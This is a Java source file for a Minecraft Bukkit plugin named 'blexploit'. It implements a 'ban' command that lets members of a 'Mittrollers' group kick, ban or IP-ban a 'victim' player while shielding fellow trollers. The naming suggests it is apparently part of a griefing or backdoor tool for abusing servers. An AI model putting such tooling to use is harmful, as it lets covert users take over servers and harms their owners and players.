package de.blexploit.command.cmds;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import api.Fehler;
import de.blexploit.command.Command;
import de.blexploit.manager.TabManager;
import de.blexploit.players.Mittrollers;
import de.blexploit.players.create.MittrollerEntity;

public final class Ban extends Command {

	public Ban() {
		super("ban", "Banne Personen vom Server", TabManager.INSERT_PLAYERNAME, "-ip");
		this.setNeedAdmin(true);
	}

	@SuppressWarnings("deprecation")
	@Override
	public void run(String[] args, MittrollerEntity mt) {
		if (args.length == 2 || args.length == 3) {
			Player victim = api.Get.victim(args, 1);
			if (victim == null) {
				mt.fehler(Fehler.PLAYER_NOT_FOUND);
				return;
			}
			if (Mittrollers.containsP(victim)) {
				mt.fehler(Fehler.MITROLLER_BLOCK);
				return;
			}
			victim.kickPlayer("");
			victim.setBanned(true);
			if (args.length == 3) {
				if (args[2].equalsIgnoreCase("-ip")) {
					if (Unban.unblockIp.contains(victim.getName())) {
						Unban.unblockIp.remove(victim.getName());
					}
					Bukkit.banIP(victim.getAddress().getAddress().getHostAddress().toString());
					this.SpielerInfo(mt, "hat §c" + victim.getName() + CHAT_COLOR + " ip gesperrt");
				}
			} else {
				this.SpielerInfo(mt, "hat §c" + victim.getName() + CHAT_COLOR + " gesperrt");
			}
		} else {
			mt.fehler(Fehler.ARGUMENT_EXCEPTION);
			mt.benutze(this);
		}
	}

}
